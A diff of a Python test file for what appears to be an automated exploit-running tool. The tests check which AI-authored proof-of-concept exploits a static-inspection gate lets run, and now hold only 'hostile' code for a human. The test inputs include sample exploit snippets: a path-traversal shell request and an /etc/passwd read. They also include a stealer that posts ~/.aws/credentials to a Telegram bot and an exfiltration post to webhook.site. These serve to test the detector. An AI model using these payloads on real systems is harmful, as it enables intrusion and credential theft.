@@ -42,19 +42,135 @@ def test_auto_run_on_by_default():
     assert settings.auto_run_public_poc is True
 
 
-def test_auto_run_policy_requires_both_readings_clean():
-    # Mirror the condition in campaign.run_campaign: run only when the target
-    # vet passed AND the operator-safety inspection found nothing.
-    def should_run(outcome):
-        return bool(outcome and settings.auto_run_public_poc
-                    and outcome.get("allowed")
-                    and outcome.get("inspection_verdict") == "review")
+# ---- the pincer: what could both run in the sandbox AND pass the gate -------
+#
+# Nothing could, which on its own explains "zero confirmed". The image had no
+# HTTP client, so the only Python that could reach the target was
+# urllib.request.urlopen - and `urlopen(` was filed as exfiltration at
+# SEV_HIGH, which forced the verdict to "suspicious", which the gate refused.
+# Meanwhile the authoring prompt demands POST/PUT/DELETE, and `requests.post(`
+# was filed the same way. The intersection of "runs" and "passes" was empty.
 
-    assert should_run({"allowed": True, "inspection_verdict": "review"})
-    assert not should_run({"allowed": False, "inspection_verdict": "review"})
-    assert not should_run({"allowed": True, "inspection_verdict": "suspicious"})
-    assert not should_run({"allowed": True, "inspection_verdict": "hostile"})
-    assert not should_run(None)
+_REALISTIC_EXPLOITS = {
+    "requests.post to the target": (
+        "import os, requests\n"
+        "r = requests.post('http://app.example.com/cgi-bin/x', data={'a': 1})\n"
+        "print(r.text[:200])\n"
+    ),
+    "urllib to the target": (
+        "import urllib.request\n"
+        "print(urllib.request.urlopen('http://app.example.com/etc/passwd').read()[:200])\n"
+    ),
+    "published PoC shape: argparse + post + environ": (
+        "import argparse, os, requests\n"
+        "p = argparse.ArgumentParser(); p.add_argument('target')\n"
+        "a = p.parse_args()\n"
+        "proxy = os.environ.get('HTTP_PROXY')\n"
+        "r = requests.post(a.target + '/cgi-bin/.%2e/bin/sh', data='echo id')\n"
+        "print(r.text[:200])\n"
+    ),
+    "bash + curl": (
+        "#!/bin/bash\n"
+        "curl -s -d 'cmd=id' http://app.example.com/upload\n"
+    ),
+}
+
+
+# ---- the gate, called rather than re-implemented ---------------------------
+#
+# This used to be a local `should_run()` that restated the condition from
+# campaign.py. It therefore tested its own copy: when the real gate was wrong -
+# it demanded verdict == "review", which no working exploit ever has - the test
+# was green, because the copy was wrong in exactly the same way. The gate is
+# now driven for real.
+
+@pytest.fixture
+def gate(monkeypatch):
+    """Drive campaign._auto_run_staged and report whether the PoC ran."""
+    from app.exploit import campaign
+    from app.sandbox.inspect import inspect_code
+
+    ran = {}
+
+    async def _execute(eng, poc, *, timeout, decided_by, argv=None):
+        ran["poc"] = poc.id
+        return {"result": {"exit_code": 0, "stdout": "proved it"}}
+
+    class _Repo:
+        def __init__(self, poc):
+            self._poc = poc
+
+        async def get(self, _id):
+            return self._poc
+
+    async def _true():
+        return True
+
+    async def _emit(*a, **k):
+        return None
+
+    monkeypatch.setattr("app.exploit.poc_run.execute_poc", _execute)
+    monkeypatch.setattr("app.exploit.settings_live.auto_run_poc", _true)
+    monkeypatch.setattr(campaign.events, "emit", _emit)
+
+    def stage(code, *, allowed=True, scope=("app.example.com",)):
+        """Inspect `code` for real and stage the result. Returns (report, poc)."""
+        report = inspect_code(code, filename="poc.py", scope_hosts=list(scope))
+        poc = SimpleNamespace(
+            id="poc_gate", code=code, language="python", repo="o/r", path="poc.py",
+            inspection={"verdict": report.verdict, "origin": "authored",
+                        "vetting": {"allowed": allowed}})
+        monkeypatch.setattr(campaign, "StagedPoCRepository", lambda: _Repo(poc))
+        ran.clear()
+        return report, poc
+
+    stage.ran = ran
+    return stage
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("label", sorted(_REALISTIC_EXPLOITS))
+async def test_the_gate_lets_a_working_exploit_through(label, gate):
+    """The pincer. Combined with a sandbox image that had no HTTP client, this
+    line is why a run could author an exploit, rehearse it, and still report
+    zero confirmed findings."""
+    from app.exploit import campaign
+
+    report, poc = gate(_REALISTIC_EXPLOITS[label])
+    out = await campaign._auto_run_staged(_eng(), poc.id)
+    assert out.get("ran") is True, f"{label}: {out.get('reason')} ({report.summary})"
+    assert gate.ran.get("poc") == poc.id, "the gate said yes but nothing executed"
+
+
+@pytest.mark.asyncio
+async def test_the_gate_still_stops_a_stealer(gate):
+    stealer = ("import os, requests\n"
+               "k = open(os.path.expanduser('~/.aws/credentials')).read()\n"
+               "requests.post('https://api.telegram.org/botX/send', data=k)\n")
+    from app.exploit import campaign
+
+    _report, poc = gate(stealer)
+    out = await campaign._auto_run_staged(_eng(), poc.id)
+    assert out.get("ran") is False
+    assert "critical signal" in out.get("reason", "")
+    assert not gate.ran, "a stealer was executed"
+
+
+@pytest.mark.asyncio
+async def test_the_gate_still_honours_the_target_vet(gate):
+    """What the PoC does TO the target is vetting's call, not inspection's."""
+    from app.exploit import campaign
+
+    _report, poc = gate("import requests\nrequests.get('http://app.example.com')\n",
+                        allowed=False)
+    out = await campaign._auto_run_staged(_eng(), poc.id)
+    assert out.get("ran") is False
+    assert "vetting" in out.get("reason", "")
+    assert not gate.ran
+
+
+def test_auto_run_on_by_default_in_config():
+    assert settings.auto_run_public_poc is True
 
 
 # ---- every origin is actually run, not just the published ones -------------
@@ -202,13 +318,23 @@ def test_the_automatic_path_does_not_wait_for_a_human_approval():
 
 def test_only_a_poc_that_looks_hostile_to_the_operator_waits():
     """The single remaining human gate: static analysis says the PoC attacks
-    YOU (a stealer in a fake exploit repo), not the target."""
+    YOU (a stealer in a fake exploit repo), not the target.
+
+    This asserted the gate demanded verdict == "review", i.e. "no rule matched
+    at all". Every working exploit matches something - it POSTs to the target,
+    it reads an environment variable, it base64s a payload - so "suspicious" is
+    what a real exploit looks like and the gate refused all of them. Only
+    "hostile" (a SEV_CRITICAL signal: credential theft, reverse shell,
+    persistence, destruction) waits for a human now.
+    """
     import inspect as _inspect
 
     from app.exploit import campaign
 
     src = _inspect.getsource(campaign._auto_run_staged)
-    assert '"review"' in src and "needs a human" in src
+    assert '== "hostile"' in src, "the gate must only stop a hostile PoC"
+    assert '!= "review"' not in src, \
+        "gating on 'nothing matched' blocks every real exploit"
 
 
 # ---- ordering: the campaign must see the findings it works on --------------
@@ -236,3 +362,58 @@ def test_an_empty_campaign_says_so():
 
     src = _inspect.getsource(campaign.run_campaign)
     assert "no validated finding to work on" in src
+
+
+@pytest.mark.parametrize("label", sorted(_REALISTIC_EXPLOITS))
+def test_a_working_exploit_is_not_held_for_a_human(label):
+    """Writing to the target is what an exploit IS, not a signal against it."""
+    from app.sandbox.inspect import inspect_code
+
+    report = inspect_code(_REALISTIC_EXPLOITS[label], filename="poc.py",
+                          scope_hosts=["app.example.com"])
+    assert report.verdict != "hostile", (
+        f"{label} would wait for a human forever: {report.summary}")
+
+
+def test_the_same_code_pointed_at_a_collector_still_waits():
+    """The rule still has to work. An out-of-scope destination is the thing
+    that made it exfiltration in the first place."""
+    from app.sandbox.inspect import inspect_code
+
+    report = inspect_code(
+        "import requests\n"
+        "requests.post('https://webhook.site/abc', data=open('/etc/passwd').read())\n",
+        filename="poc.py", scope_hosts=["app.example.com"])
+    assert report.verdict in ("suspicious", "hostile")
+    assert any(s.category == "exfiltration" for s in report.signals)
+
+
+def test_a_stealer_is_still_hostile():
+    """The gate moved to 'hostile'; this is what must still land there."""
+    from app.sandbox.inspect import inspect_code
+
+    report = inspect_code(
+        "import os, requests\n"
+        "k = open(os.path.expanduser('~/.aws/credentials')).read()\n"
+        "requests.post('https://api.telegram.org/botX/sendMessage', data=k)\n",
+        filename="poc.py", scope_hosts=["app.example.com"])
+    assert report.verdict == "hostile", report.summary
+
+
+def test_the_sandbox_image_ships_the_client_the_prompt_promises():
+    """authoring.py tells the model to use `requests`. The image installed
+    fastapi, uvicorn and pydantic only, so every authored exploit died on
+    ModuleNotFoundError and that was reported as a failed exploit."""
+    import pathlib
+
+    from app.exploit import authoring
+
+    dockerfile = (pathlib.Path(__file__).resolve().parents[2]
+                  / "sandbox-runner" / "Dockerfile").read_text()
+    prompt = authoring._SYSTEM_BASE
+    if "requests" in prompt:
+        assert "requests==" in dockerfile, \
+            "the prompt promises `requests`; the sandbox must have it"
+    if "curl" in prompt:
+        assert "curl" in dockerfile, \
+            "the prompt promises curl; the sandbox must have it"
